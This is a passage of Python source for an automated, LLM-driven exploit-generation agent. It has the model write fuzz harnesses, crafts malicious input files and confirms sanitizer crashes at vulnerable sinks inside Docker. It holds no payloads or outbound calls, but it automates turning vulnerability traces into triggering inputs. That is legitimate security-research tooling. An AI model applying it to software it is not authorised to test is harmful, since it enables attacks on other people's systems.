"""Staged exploit agent with state-object architecture.

Stages:
  0. UNDERSTAND  — system reads sink, entry, header, fuzzers (no LLM)
  1. EXPLORE     — LLM fills gaps from UNDERSTAND (only if needed)
  2. BUILD       — LLM fixes library build (failed files, stubs)
  3. WRITE       — LLM writes harness (sees state object + last 2 exchanges)
  4. COMPILE     — LLM fixes errors (Hard Reset + Dynamic API Hinting)
  5. LINK        — system resolves dependencies
  6. RUN         — system runs binary with test input
  7. SWEEP       — system tries all test files
  8. INPUT_REFLECTION — framework reads parser code, finds samples, asks LLM for raw file content, tests it
  9. RUN_CRAFTED — system runs binary with crafted input
 10. VERIFY      — GDB + ASAN confirms crash at sink

All failure routing goes through _decide_recovery(), which considers
turns remaining, what has been tried, and failure type to pick the
optimal next stage.  The LLM never sees more than 2 prior exchanges.
The state object IS the memory.
"""

from __future__ import annotations
import logging, re, time
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Callable

from deeptrace.exploit.docker_env import DockerEnv, ExecResult
from deeptrace.exploit.repo_analyzer import RepoProfile
from deeptrace.exploit.verification import verify_harness, VerificationResult
from deeptrace.models.graph import TracePath

logger = logging.getLogger(__name__)

# =====================================================================
# State
# =====================================================================

class Stage(Enum):
    UNDERSTAND = auto(); EXPLORE = auto(); BUILD = auto()
    WRITE = auto(); COMPILE = auto(); LINK = auto()
    RUN = auto(); SWEEP = auto(); INPUT_REFLECTION = auto()
    RUN_CRAFTED = auto(); VERIFY = auto()
    SUCCESS = auto(); HALTED = auto()

@dataclass
class StateObject:
    """Structured facts accumulated across stages."""
    sink_function: str = ""; sink_file: str = ""
    entry_function: str = ""; entry_file: str = ""
    # callable_target: the nearest CALLABLE function on the trace path
    # that the harness must invoke.  May differ from sink_function when
    # the sink is a variable, expression, or inlined code (e.g., dest_scan
    # is a pointer, not a function — the callable target is GetBPP or
    # TransferWithMultipleBPP which internally computes dest_scan).
    callable_target: str = ""
    vuln_tags: list[str] = field(default_factory=list)
    vuln_summary: str = ""; trace_text: str = ""
    sink_source: str = ""; entry_source: str = ""
    header_file: str = ""; header_declarations: str = ""
    include_flags: str = ""; reference_harness: str = ""
    test_files: list[str] = field(default_factory=list)
    input_format: str = "binary"; input_ext: str = ".bin"
    repo_layout: str = ""
    compile_errors: list[str] = field(default_factory=list)
    link_errors: str = ""; run_output: str = ""
    crash_type: str = ""; crash_file: str = ""
    pipeline_attempts: int = 0
    backward_reasons: list[str] = field(default_factory=list)
    # Cross-cycle memory: what the LLM tried last time and what happened
    last_harness_source: str = ""  # the .cpp code from the last WRITE cycle
    last_run_feedback: str = ""    # what happened when we ran it (crash? clean? output?)
    sink_confirmed_reachable: bool = False  # GDB confirmed sink is reachable in current harness
    call_chain: str = ""           # discovered call chain: public_api → ... → sink
    data_source_info: str = ""     # how attacker data reaches the sink (struct member writes, etc.)
    reasoning_analysis: str = ""   # deep vulnerability analysis from `deeptrace reason` (root cause, trigger, exploit sketch)
    reflection_insight: str = ""   # strategic analysis from REFLECT stage (what to do differently)
    prebuild_success: bool = False; prebuild_archive: str = ""
    prebuild_objects: list[str] = field(default_factory=list)
    prebuild_compile_flags: str = ""; prebuild_sink_obj: str = ""
    library_root: str = ""
    prebuild_failed_detail: list[dict] = field(default_factory=list)
    prebuild_undefined_symbols: list[str] = field(default_factory=list)
    prebuild_internal_headers: list[str] = field(default_factory=list)
    prebuild_verify_ok: bool = False

    def summary(self) -> str:
        lines = [f"SINK: {self.sink_function} @ {self.sink_file}",
                 f"ENTRY: {self.entry_function} @ {self.entry_file}"]
        if self.callable_target and self.callable_target != self.sink_function:
            lines.append(f"CALLABLE TARGET: {self.callable_target} (sink '{self.sink_function}' is not directly callable)")
        lines.append(f"VULN: {', '.join(self.vuln_tags) or 'unknown'} — {self.vuln_summary or 'N/A'}")
        if self.header_file: lines.append(f"HEADER: {self.header_file}")
        if self.include_flags: lines.append(f"COMPILE FLAGS: {self.include_flags}")
        if self.library_root:
            lines.append(f"LIBRARY: {self.library_root} ({'pre-built' if self.prebuild_success else 'not built'})")
            if self.prebuild_archive: lines.append(f"ARCHIVE: {self.prebuild_archive}")
        if self.input_format != "binary": lines.append(f"INPUT FORMAT: {self.input_format} ({self.input_ext})")
        if self.test_files: lines.append(f"TEST FILES: {', '.join(self.test_files[:5])}")
        if self.backward_reasons:
            lines.append("PREVIOUS ATTEMPTS FAILED:")
            for r in self.backward_reasons[-3:]: lines.append(f"  - {r}")
        return "\n".join(lines)

# =====================================================================
# Prompts
# =====================================================================

_TOOLS_BLOCK = """
=== TOOLS ===
<shell>ls /src/ | head -20</shell>
  Run any shell command inside the Docker container.
<write_file path="/work/harness.cpp">
#include <stdio.h>
int main() { return 0; }
</write_file>
  Create or overwrite a file.
<read_file path="/src/some/file.c" />
  Read a file.
=== RULES ===
- Every response MUST contain at least one tool tag
- Fix the SPECIFIC error — do not rewrite from scratch
"""

# =====================================================================
# Action parsing
# =====================================================================

@dataclass
class AgentAction:
    kind: str; content: str = ""; path: str = ""; target: str = ""

_PLACEHOLDERS = frozenset({"command","your command here","your command","command here",
                           "content","your reasoning","your reasoning here","summary"})

def parse_actions(response: str) -> list[AgentAction]:
    actions: list[AgentAction] = []
    cleaned = re.sub(r"<think>.*?</think>", "", response, flags=re.DOTALL)

    # ── Pass 1: XML-style tags (highest priority) ────────────────────
    for m in re.finditer(r"<shell>(.*?)</shell>", cleaned, re.DOTALL):
        cmd = m.group(1).strip()
        if not cmd: continue
        if cmd.lower() in _PLACEHOLDERS:
            after = cleaned[m.end():m.end()+300].strip().split("\n")[0].strip()
            if after and re.match(r'^[a-z/]', after) and len(after) > 3:
                actions.append(AgentAction(kind="shell", content=after))
            continue
        actions.append(AgentAction(kind="shell", content=cmd))

    # write_file: handle both double and single quotes, optional extra attributes
    for m in re.finditer(r'<write_file\s+path=["\']([^"\']+)["\'][^>]*>(.*?)</write_file>', cleaned, re.DOTALL):
        actions.append(AgentAction(kind="write_file", path=m.group(1), content=m.group(2)))

    for m in re.finditer(r'<read_file\s+path=["\']([^"\']+)["\']\s*/?>', cleaned):
        actions.append(AgentAction(kind="read_file", path=m.group(1)))

    # ── Pass 1b: ALWAYS check markdown cpp blocks for harness code ───
    # This runs even when XML tags were found, because models often mix
    # <shell>grep ...</shell> with ```cpp\n#include...\n```
    for m in re.finditer(r"```(?i:cpp|c\+\+|c|cc|cxx)\s*\n([\s\S]*?)\n\s*```", cleaned):
        code = m.group(1).strip()
        if "#include" in code and ("int main" in code or "LLVMFuzzerTestOneInput" in code):
            # Only add if we don't already have a write_file for harness
            if not any(a.kind == "write_file" and "harness" in a.path for a in actions):
                actions.append(AgentAction(kind="write_file",
                                           path="/work/harness.cpp", content=code))

    # ── Pass 1c: Detect shell-based file writes (cat heredoc, tee) ───
    # Models like minimax often write: <shell>cat > /work/harness.cpp << 'EOF'\n...\nEOF</shell>
    for a in list(actions):
        if a.kind != "shell":
            continue
        # cat/tee heredoc: cat > /path << 'DELIM'\n...\nDELIM
        hd = re.match(
            r"(?:cat|tee)\s+>?\s*(/work/\S+\.(?:cpp|c|h))\s*<<\s*['\"]?(\w+)['\"]?\s*\n"
            r"(.*?)\n\2",
            a.content, re.DOTALL,
        )
        if hd:
            path, _, content = hd.group(1), hd.group(2), hd.group(3)
            actions.append(AgentAction(kind="write_file", path=path, content=content))
            logger.info("Detected shell heredoc write to %s (%d chars)", path, len(content))
            continue
        # echo multi-line: echo '#include...' > /path
        em = re.match(
            r"""echo\s+['"](.*?)['"]\s*>\s*(/work/\S+\.(?:cpp|c|h))""",
            a.content, re.DOTALL,
        )
        if em:
            content, path = em.group(1), em.group(2)
            actions.append(AgentAction(kind="write_file", path=path, content=content))

    # If we found XML/markdown actions, also parse markdown bash blocks
    # (model might mix <shell> with ```bash``` or ```cpp``` with ```bash```)
    has_shell = any(a.kind == "shell" for a in actions)
    if actions and not has_shell:
        for m in re.finditer(r"```(?:bash|sh|shell)\s*\n([\s\S]*?)\n\s*```", cleaned):
            for line in m.group(1).strip().split("\n"):
                s = line.strip()
                if s and not s.startswith("#"):
                    actions.append(AgentAction(kind="shell", content=s))

    if actions:
        return actions
    for m in re.finditer(r'\[shell\]\s*(.*?)\s*\[/shell\]', cleaned, re.DOTALL):
        cmd = m.group(1).strip()
        if cmd and cmd.lower() not in _PLACEHOLDERS:
            actions.append(AgentAction(kind="shell", content=cmd))
    for m in re.finditer(r'\[write_file\s+path=["\']([^"\']+)["\']\]?\s*(.*?)\s*\[/write_file\]', cleaned, re.DOTALL):
        actions.append(AgentAction(kind="write_file", path=m.group(1), content=m.group(2)))
    for m in re.finditer(r'\[read_file\s+path=["\']([^"\']+)["\']\s*/?]', cleaned):
        actions.append(AgentAction(kind="read_file", path=m.group(1)))
    for m in re.finditer(r'\[shell\]\s*\$?\s*(.+?)(?:\n|$)', cleaned):
        cmd = m.group(1).strip()
        if cmd and not cmd.startswith("exit_code") and cmd.lower() not in _PLACEHOLDERS:
            if not any(a.content == cmd for a in actions):
                actions.append(AgentAction(kind="shell", content=cmd))
    # Also check for cpp blocks in bracket-mode
    for m in re.finditer(r"```(?i:cpp|c\+\+|c|cc|cxx)\s*\n([\s\S]*?)\n\s*```", cleaned):
        code = m.group(1).strip()
        if "#include" in code and ("int main" in code or "LLVMFuzzerTestOneInput" in code):
            if not any(a.kind == "write_file" and "harness" in a.path for a in actions):
                actions.append(AgentAction(kind="write_file",
                                           path="/work/harness.cpp", content=code))
    if actions:
        return actions

    # ── Pass 3: Pure markdown fallback ───────────────────────────────
    for m in re.finditer(r"```(?:bash|sh|shell)\s*\n([\s\S]*?)\n\s*```", cleaned):
        for line in m.group(1).strip().split("\n"):
            s = line.strip()
            if s and not s.startswith("#"):
                actions.append(AgentAction(kind="shell", content=s))
    for m in re.finditer(r"```(?i:cpp|c\+\+|c|cc|cxx)\s*\n([\s\S]*?)\n\s*```", cleaned):
        code = m.group(1).strip()
        if "#include" in code and ("int main" in code or "LLVMFuzzerTestOneInput" in code):
            actions.append(AgentAction(kind="write_file",
                                       path="/work/harness.cpp", content=code))
    return actions

def extract_thought(response: str) -> str:
    m = re.search(r"<think>(.*?)</think>", response, re.DOTALL)
    return m.group(1).strip() if m else ""

# =====================================================================
# Config & Result
# =====================================================================

@dataclass
class AgentConfig:
    max_turns: int = 80; max_actions_per_turn: int = 10
    exec_timeout: int = 60; verify_timeout: int = 30
    max_write_attempts: int = 3; max_compile_attempts: int = 5
    max_pipeline_attempts: int = 5

@dataclass
class AgentResult:
    success: bool = False; verification: VerificationResult | None = None
    turns_used: int = 0; total_actions: int = 0; elapsed_seconds: float = 0.0
    harness_path: str = ""; harness_source_path: str = ""
    input_path: str = ""; input_files: list[str] = field(default_factory=list)
    final_reason: str = ""; vulnerability_report: str = ""
    run_poc_script: str = ""; postmortem: dict[str, Any] = field(default_factory=dict)
    log: list[dict[str, Any]] = field(default_factory=list)

# =====================================================================
# Agent
# =====================================================================

class ExploitAgent:

    def __init__(self, llm_caller, env, profile, trace_path, sink_function, sink_file,
                 config=None, progress_callback=None, llm_coder=None,
                 trace_config=None, all_traces=None, reasoning_analysis=None):
        self.llm_a = llm_caller
        self.llm_b = llm_coder if llm_coder else llm_caller
        self.dual = llm_coder is not None
        self.env = env; self.profile = profile; self.trace = trace_path
        self.sink_function = sink_function; self.sink_file = sink_file
        self.config = config or AgentConfig()
        self._progress = progress_callback
        self.stage = Stage.UNDERSTAND
        self.so = StateObject()
        self._exchanges: list[tuple[str, str]] = []
        self._turn = 0
        self.llm_call = llm_caller
        self.llm_code = self.llm_b

        # On-demand trace capability: Joern/tree-sitter/ACO pipeline
        # trace_config is a DeeptraceConfig (or None to disable)
        self._trace_config = trace_config
        self._trace_orchestrator = None  # lazy init

        # All trace paths from traces.json (for cross-referencing)
        self._all_traces = all_traces or []

        # Deep vulnerability analysis from `deeptrace reason`
        self._reasoning_analysis = reasoning_analysis or ""

    # ── Utility ──────────────────────────────────────────────────────
    def _clean_entry_fn(self) -> str:
        entry_fn = self.so.entry_function or self.so.sink_function
        if "|" in entry_fn:
            parts = [p.strip() for p in entry_fn.split("|") if len(p.strip()) > 3]
            parts.sort(key=len, reverse=True)
            entry_fn = parts[0] if parts else entry_fn
        return entry_fn

    # =================================================================
    # CENTRALIZED DECISION: _decide_recovery
    # =================================================================

    _init_crash_retries = 0
    _MAX_INIT_CRASH_RETRIES = 3
    _build_turns = 0
    _MAX_BUILD_TURNS = 5
    _explore_turns = 0
    _write_attempts = 0
    _compile_attempts = 0

    # Minimum turns needed for one WRITE→COMPILE→LINK→RUN cycle
    _MIN_CYCLE_BUDGET = 4

    def _decide_recovery(self, failure_type: str, context: str = "",
                         from_stage: str = "") -> None:
        """Central decision function for ALL failure routing.

        PHILOSOPHY: Never halt while there is budget for another attempt.
        pipeline_attempts drives strategy ESCALATION (more aggressive hints,
        different approaches), NOT a hard kill switch. The only reasons to
        HALT are:
          1. Fewer than _MIN_CYCLE_BUDGET turns remaining
          2. A truly unrecoverable situation (e.g., link fails on 5 different
             harnesses — the archive itself is broken)

        Sets self.stage and self._exchanges for the next turn.
        """
        so = self.so
        turns_left = self.config.max_turns - self._turn
        entry_fn = self._clean_entry_fn()

        # ── Hard budget gate — only halt when physically unable to try ─
        if turns_left < self._MIN_CYCLE_BUDGET:
            so.backward_reasons.append(
                f"budget exhausted ({turns_left} turns left): {failure_type}")
            self.stage = Stage.HALTED
            logger.warning("DECISION: HALT — only %d turns left", turns_left)
            return

        # ── Helper: build an escalating hint based on how many times
        #    we've been through WRITE already ─────────────────────────
        def _escalation_hint() -> str:
            n = so.pipeline_attempts
            hdr = so.header_file or "/src/"
            ct = so.callable_target or so.sink_function
            if n <= 1:
                return (f"Rewrite to exercise more of the trace: "
                        f"reach {so.sink_function} via {ct}")
            elif n <= 3:
                return (f"Attempt {n} failed. Try a DIFFERENT initialization path.\n"
                        f"Use <shell>grep -iE 'alloc|create|load|open|parse' "
                        f"{hdr}</shell> to discover alternative API functions.\n"
                        f"You must call {ct}() to reach {so.sink_function}")
            else:
                return (f"Attempt {n} failed. DRASTICALLY change your approach:\n"
                        f"- Read the REFERENCE FUZZER again if available\n"
                        f"- Call {ct}() — this is the function that reaches {so.sink_function}\n"
                        f"- Try a different entry point from the trace\n"
                        f"- Use <shell>grep -rn '{ct}' /src/ --include='*.c' | head -5</shell> "
                        f"to see how {ct} is called in the actual codebase")

        # ── init_crash ───────────────────────────────────────────────
        if failure_type == "init_crash":
            so.backward_reasons.append(
                f"init_crash from {from_stage}: {context[:100]}")
            if self._build_turns < self._MAX_BUILD_TURNS and turns_left > 6:
                logger.info("DECISION: init_crash → BUILD")
                so.run_output = context
                self.env.exec("rm -f /work/harness", timeout=3)
                self.stage = Stage.BUILD
            else:
                # BUILD exhausted or budget tight — route to WRITE with
                # escalating guidance.  No hard cap on retries: as long as
                # we have budget, we keep trying different approaches.
                self._init_crash_retries += 1
                logger.info("DECISION: init_crash → WRITE (retry %d)",
                            self._init_crash_retries)
                if self._init_crash_retries <= 2:
                    hint = (f"⚠️ The library crashes during initialization.\n"
                            f"Try a COMPLETELY DIFFERENT APPROACH:\n"
                            f"- Use <shell>grep -iE 'load|parse|read|fromfile' "
                            f"{so.header_file or '/src/ --include=*.h'}</shell> to find a file-loading API\n"
                            f"- Target entry: {entry_fn}\n"
                            f"- Write a NEW /work/harness.cpp avoiding the crashing init.")
                else:
                    hint = (f"⚠️ Init crash retry {self._init_crash_retries}. "
                            f"Previous approaches ALL crashed during init.\n"
                            f"- Search the codebase for how {so.callable_target or so.sink_function} is actually called:\n"
                            f"  <shell>grep -rn '{so.callable_target or so.sink_function}' /src/ --include='*.c' | head -10</shell>\n"
                            f"- Try calling {so.callable_target or so.sink_function} directly with minimal setup\n"
                            f"- Or pass input data directly without allocating a library handle")
                self._exchanges = [("(system)", hint)]
                self.stage = Stage.WRITE
                self._write_attempts = 0; self._compile_attempts = 0
            return

        # ── compile_stuck (Hard Reset) ───────────────────────────────
        if failure_type == "compile_stuck":
            so.backward_reasons.append(f"compile stuck: {context[:100]}")
            self._exchanges = [("(system)",
                f"⚠️ You are stuck in a compilation loop hallucinating functions "
                f"that do not exist.\n"
                f"Target entry point: {entry_fn}\n"
                f"Use <shell>grep -iE 'alloc|create|new|init|load' "
                f"{so.header_file or '/src/ --include=*.h'}</shell> to find the real API.\n"
                f"Write a completely NEW harness from scratch.")]
            self.stage = Stage.WRITE
            self._write_attempts = 0; self._compile_attempts = 0
            so.compile_errors.clear()
            return

        # ── compile_failed (reviewer escalation) ─────────────────────
        if failure_type == "compile_failed":
            so.backward_reasons.append(f"compile failed: {context[:100]}")
            cycle_count = sum(1 for r in so.backward_reasons
                              if "compile failed" in r)
            if cycle_count >= 3 and not so.header_declarations and turns_left > 8:
                logger.info("DECISION: compile_failed 3x without header → EXPLORE")
                self.stage = Stage.EXPLORE; self._explore_turns = 0
            else:
                self.stage = Stage.WRITE
            self._write_attempts = 0; self._compile_attempts = 0
            self._exchanges.clear()
            return

        # ── harness_stripped ──────────────────────────────────────────
        if failure_type == "harness_stripped":
            so.backward_reasons.append(
                f"LLM stripped library calls: {context[:100]}")
            self._exchanges = [("(system)",
                f"⚠️ You removed all library calls to fix the compile error.\n"
                f"The harness MUST call {entry_fn}.\n"
                f"Fix the include path or function signatures, not the logic.")]
            self.stage = Stage.WRITE
            self._write_attempts = 0; self._compile_attempts = 0
            return

        # ── link_failed ──────────────────────────────────────────────
        if failure_type == "link_failed":
            cnt = sum(1 for r in so.backward_reasons if "link failed" in r)
            so.backward_reasons.append(f"link failed: {context[:100]}")
            so.link_errors = context
            # Only HALT if we've exhausted budget on link failures
            # (8+ failures with same archive means the archive is broken)
            if cnt >= 8:
                so.backward_reasons.append("link failed repeatedly")
                self.stage = Stage.HALTED
            else:
                self._exchanges = [("(system)",
                    f"⚠️ LINK FAILED.\n{context[:500]}\n"
                    f"Library at {so.prebuild_archive or '/work/build/'}. "
                    f"Use public header functions only.\n"
                    f"Common fix: use only functions declared in the public header, "
                    f"avoid internal/private functions.")]
                self.stage = Stage.WRITE; self._write_attempts = 0
            return

        # ── harness_bug ──────────────────────────────────────────────
        if failure_type == "harness_bug":
            so.backward_reasons.append(f"harness bug: {context[:100]}")

            # Count consecutive harness_bug failures
            consecutive_hb = 0
            for r in reversed(so.backward_reasons):
                if "harness bug" in r:
                    consecutive_hb += 1
                else:
                    break

            if consecutive_hb >= 3:
                # 3+ identical "harness_bug" crashes means the problem is NOT
                # the harness code — it's the library stubs or linking.
                # Common cause: ASAN stubs that destroy the sanitizer runtime.
                # Route to BUILD to fix the library, not rewrite the harness.
                logger.info("DECISION: %d consecutive harness_bug → BUILD (not WRITE)",
                            consecutive_hb)
                self._exchanges = [("(system)",
                    f"⚠️ The harness keeps crashing ({consecutive_hb}x) but the harness CODE is correct.\n"
                    f"The problem is in the LIBRARY BUILD — likely broken stubs or ASAN mismatch.\n"
                    f"DO NOT stub __asan_* or __sanitizer_* functions — they are provided by -fsanitize=address.\n"
                    f"Check /work/build/stubs.c for incorrect stub implementations.\n"
                    f"Crash: {context[:300]}")]
                self.stage = Stage.BUILD; self._build_turns = 0
            else:
                self._exchanges = [("(system)",
                    f"⚠️ Crash in YOUR harness, not library:\n"
                    f"{context[:500]}\nFix the bug.")]
                self.stage = Stage.WRITE; self._write_attempts = 0
            return

        # ── wrong_location ───────────────────────────────────────────
        if failure_type == "wrong_location":
            so.pipeline_attempts += 1
            so.backward_reasons.append(
                f"crash at wrong location: {context[:80]}")
            # wrong_location is PROGRESS — the library runs, just hits the
            # wrong spot.  Always retry with better guidance.
            self._exchanges = [("(system)",
                f"⚠️ Crash at wrong function.\nTarget: {so.sink_function}\n"
                f"{_escalation_hint()}")]
            self.stage = Stage.WRITE; self._write_attempts = 0
            return

        # ── no_crash ─────────────────────────────────────────────────
        if failure_type == "no_crash":
            so.pipeline_attempts += 1
            so.backward_reasons.append(
                f"attempt {so.pipeline_attempts}: no crash ({from_stage})")

            # If GDB confirmed the sink IS reachable, the harness is fine.
            # Don't rewrite it — keep crafting better inputs.
            if so.sink_confirmed_reachable:
                # pipeline_attempts tracks total failed cycles (never cleared).
                # Allow up to 3 full CRAFT rounds (each is 2-3 turns) before
                # giving up on this harness and rewriting.
                if so.pipeline_attempts <= 3:
                    logger.info("DECISION: no_crash but sink reachable → CRAFT (attempt %d)",
                                so.pipeline_attempts)
                    self._exchanges = [("(system)",
                        f"⚠️ The harness is CORRECT (GDB confirmed sink is reachable).\n"
                        f"The input does not trigger the vulnerability. Craft a DIFFERENT payload.\n"
                        f"Vuln type: {', '.join(so.vuln_tags) or 'unknown'}\n"
                        f"{_escalation_hint()}")]
                    # Clear per-round craft retries so RUN_CRAFTED allows 2 new attempts
                    so.backward_reasons = [r for r in so.backward_reasons
                                           if "craft retry" not in r]
                    self.stage = Stage.INPUT_REFLECTION
                    return
                else:
                    # Even crafting can't trigger it after 3 rounds — try new harness
                    so.sink_confirmed_reachable = False
                    logger.info("DECISION: sink reachable but %d pipeline attempts → WRITE",
                                so.pipeline_attempts)

            # Differentiate: sink never reached vs. reached but input doesn't trigger
            if "never reached" in context.lower():
                ct = so.callable_target or so.sink_function
                self._exchanges = [("(system)",
                    f"⚠️ Your harness compiled and ran but NEVER CALLED {ct}().\n"
                    f"GDB confirmed {ct} was never hit.\n"
                    f"Your harness must contain an actual call: {ct}(args...);\n"
                    f"Look at the REFERENCE FUZZER and TRACE to see how to reach it.\n"
                    f"{_escalation_hint()}")]
                self.stage = Stage.WRITE
            else:
                # Check: is the harness already loading a file? If so, the problem
                # is the INPUT, not the harness. Route to INPUT_REFLECTION.
                harness_loads_file = (so.last_harness_source and any(
                    kw in so.last_harness_source
                    for kw in ["LoadFromFile", "LoadFromMem", "fopen", "fread",
                               "argv[1]", "argv[ 1]"]))
                knows_file_input = (so.input_format == "file" or
                                     (so.reflection_insight and "file" in so.reflection_insight.lower()))

                if harness_loads_file and knows_file_input:
                    logger.info("DECISION: harness loads file + file-based vuln → INPUT_REFLECTION")
                    self._exchanges = [("(system)",
                        f"⚠️ The harness loads input from a file — that's correct.\n"
                        f"The input file content does not trigger the vulnerability.\n"
                        f"The framework will now craft a malicious input file.")]
                    self.stage = Stage.INPUT_REFLECTION
                else:
                    self._exchanges = [("(system)",
                        f"⚠️ {_escalation_hint()}")]
                    self.stage = Stage.WRITE
            self._write_attempts = 0; self._compile_attempts = 0
            return

        # ── verify_failed ────────────────────────────────────────────
        if failure_type == "verify_failed":
            so.pipeline_attempts += 1
            so.backward_reasons.append(f"verify failed: {context[:100]}")
            self._exchanges = [("(system)",
                f"⚠️ Verification failed: {context[:200]}\n"
                f"{_escalation_hint()}")]
            self.stage = Stage.WRITE; self._write_attempts = 0
            return

        # ── write_exhausted ──────────────────────────────────────────
        if failure_type == "write_exhausted":
            so.backward_reasons.append(
                f"WRITE exhausted {self.config.max_write_attempts} attempts")
            if not so.header_declarations and turns_left > 8:
                logger.info("DECISION: WRITE exhausted, no header → EXPLORE")
                self.stage = Stage.EXPLORE; self._explore_turns = 0
            else:
                # Reset and try again with stronger hints
                self._exchanges = [("(system)",
                    f"⚠️ Previous harness attempts invalid.\n"
                    f"Use <shell>grep -iE 'alloc|create|load|init' "
                    f"{so.header_file or '/src/ --include=*.h'}</shell> to find the API.\n"
                    f"Write a MINIMAL harness — just #include, main, one API call.")]
                self.stage = Stage.WRITE; self._write_attempts = 0
            return

        # ── Default: always try WRITE if budget allows ───────────────
        logger.warning("DECISION: unhandled '%s' — routing to WRITE", failure_type)
        so.backward_reasons.append(f"unhandled: {failure_type}")
        self.stage = Stage.WRITE; self._write_attempts = 0

    # =================================================================
    # Main loop
    # =================================================================

    def run(self) -> AgentResult:
        t0 = time.time()
        result = AgentResult()
        result.log.append({"event": "agent_start", "stage": self.stage.name,
                           "sink": self.sink_function, "repo": self.profile.repo_name})
        self._run_understand()
        result.log.append({"event": "understand_done", "has_sink_source": bool(self.so.sink_source),
                           "has_header": bool(self.so.header_file),
                           "has_reference": bool(self.so.reference_harness),
                           "test_files": len(self.so.test_files)})

        # Gate 0: decide initial stage
        if self.so.sink_source and self.so.header_declarations:
            if self.so.prebuild_failed_detail and not self.so.prebuild_verify_ok:
                self.stage = Stage.BUILD
            else:
                self.stage = Stage.WRITE
        elif self.so.sink_source:
            self.stage = Stage.EXPLORE
        else:
            self.stage = Stage.EXPLORE

        for self._turn in range(self.config.max_turns):
            if self.stage in (Stage.SUCCESS, Stage.HALTED): break
            if self._progress:
                self._progress(f"Turn {self._turn+1} [{self.stage.name}]", self._turn)
            turn_log = {"event": "turn", "turn": self._turn+1, "stage": self.stage.name,
                        "timestamp": time.time()}
            if   self.stage == Stage.EXPLORE:  self._run_explore_turn(result, turn_log)
            elif self.stage == Stage.BUILD:    self._run_build_turn(result, turn_log)
            elif self.stage == Stage.WRITE:    self._run_write_turn(result, turn_log)
            elif self.stage == Stage.COMPILE:  self._run_compile_turn(result, turn_log)
            elif self.stage in (Stage.LINK, Stage.RUN, Stage.SWEEP, Stage.INPUT_REFLECTION,
                                Stage.RUN_CRAFTED, Stage.VERIFY):
                self._run_pipeline(result, turn_log)
            else: break
            result.turns_used = self._turn + 1
            result.log.append(turn_log)

        result.elapsed_seconds = round(time.time() - t0, 2)
        if not result.success:
            result.postmortem = {"turns": result.turns_used, "stage": self.stage.name,
                                 "backward_reasons": self.so.backward_reasons}
        result.log.append({"event": "agent_end", "success": result.success,
                           "turns": result.turns_used, "elapsed": result.elapsed_seconds})
        return result

    # =================================================================
    # STAGE 0: UNDERSTAND
    # =================================================================

    def _run_understand(self):
        so = self.so
        so.sink_function = self.sink_function; so.sink_file = self.sink_file
        so.vuln_tags = self.trace.vulnerability_tags or []
        so.vuln_summary = self.trace.vulnerability_summary or ""
        so.reasoning_analysis = self._reasoning_analysis

        # ── Build rich trace text from ALL TracePath fields ──────────
        # Include node_name, edge_kind, node_kind — the LLM needs these
        # to understand the call chain and data flow
        lines = []
        prev_file = ""
        for i, s in enumerate(self.trace.steps[:30]):
            loc = f"{s.location.file}:{s.location.line}" if s.location else "?"
            tag = " [ENTRY]" if i == 0 else (" [SINK]" if i == len(self.trace.steps)-1 else "")
            edge = f" [{s.edge_kind.value}]" if s.edge_kind else ""
            kind = f" ({s.node_kind.value})" if s.node_kind else ""
            name = f" {s.node_name}" if s.node_name else ""
            snippet = (s.code_snippet or "?")[:120]

            # Mark cross-file transitions
            curr_file = s.location.file if s.location else ""
            file_change = ""
            if curr_file and curr_file != prev_file and prev_file:
                file_change = " ← CROSS-FILE"
            prev_file = curr_file

            lines.append(f"  {i}{tag}{file_change}: {loc}{edge}{kind}{name}")
            lines.append(f"      {snippet}")
        so.trace_text = "\n".join(lines)

        # Include Z3 satisfiability in trace context
        if self.trace.is_satisfiable is True:
            so.trace_text += "\n\n  Z3: PATH IS SATISFIABLE (reachable)"
            if self.trace.z3_model:
                so.trace_text += f"\n  Z3 model: {self.trace.z3_model[:300]}"
        elif self.trace.is_satisfiable is False:
            so.trace_text += "\n\n  Z3: PATH IS UNSATISFIABLE (may be unreachable)"

        # Entry point info
        if self.trace.steps:
            entry = self.trace.steps[0].location
            if entry and entry.file:
                so.entry_file = entry.file
                so.entry_function = self.trace.steps[0].node_name or ""
        if not self.env.is_running: return

        # ── Read source code at key trace locations ──────────────────
        # Not just entry/sink — also read at cross-file boundaries
        # so the LLM can see the full calling context
        files_read = set()

        # Sink source
        sink_loc = self.trace.steps[-1].location if self.trace.steps else None
        if sink_loc and sink_loc.file:
            r = self.env.exec(f"sed -n '{max(1,sink_loc.line-15)},{sink_loc.line+15}p' /src/{sink_loc.file} 2>/dev/null", timeout=5)
            so.sink_source = r.stdout.strip()[:2000] if r.stdout.strip() else ""
            files_read.add(sink_loc.file)

        # ── Data source discovery ────────────────────────────────────
        # When the sink uses a struct member (it8->DoubleFormatter, obj->buffer),
        # the LLM needs to know WHERE that member is WRITTEN — that's the
        # actual attack surface.  Without this, the LLM tries to set it via
        # the wrong API (cmsIT8SetPropertyStr instead of loading a crafted file).
        if so.sink_source:
            self._discover_data_source(so, sink_loc)

        # Entry source
        entry_loc = self.trace.steps[0].location if self.trace.steps else None
        if entry_loc and entry_loc.file:
            r = self.env.exec(f"sed -n '{max(1,entry_loc.line-10)},{entry_loc.line+10}p' /src/{entry_loc.file} 2>/dev/null", timeout=5)
            so.entry_source = r.stdout.strip()[:1500] if r.stdout.strip() else ""
            files_read.add(entry_loc.file)

        # Read source at cross-file boundaries (up to 3 intermediate files)
        cross_file_sources = []
        prev_f = ""
        for step in self.trace.steps[1:-1]:  # skip entry and sink (already read)
            if not step.location or not step.location.file:
                continue
            f = step.location.file
            if f != prev_f and f not in files_read and len(cross_file_sources) < 3:
                r = self.env.exec(
                    f"sed -n '{max(1,step.location.line-8)},{step.location.line+8}p' /src/{f} 2>/dev/null",
                    timeout=5)
                if r.stdout.strip():
                    cross_file_sources.append(f"=== {f}:{step.location.line} ({step.node_name or '?'}) ===\n{r.stdout.strip()[:800]}")
                    files_read.add(f)
            prev_f = f

        if cross_file_sources:
            so.entry_source += "\n\n" + "\n\n".join(cross_file_sources)

        GENERIC = {"buffer","buf","data","ptr","len","size","result","ret","val","value","str","msg","err","tmp","ctx","handle","status","count","index","offset","flag","type","name","cmsexport","cmsapi","winapi","stdcall","cdecl","dllexport","dllimport","export","import","extern","static","inline","void","const","bool","int","char","float","double","long","uint32","int32","uint64","int64"}
        search_terms = []
        for step in self.trace.steps:
            if not step.node_name or len(step.node_name) < 4: continue
            for part in step.node_name.split("|"):
                fn = part.strip()
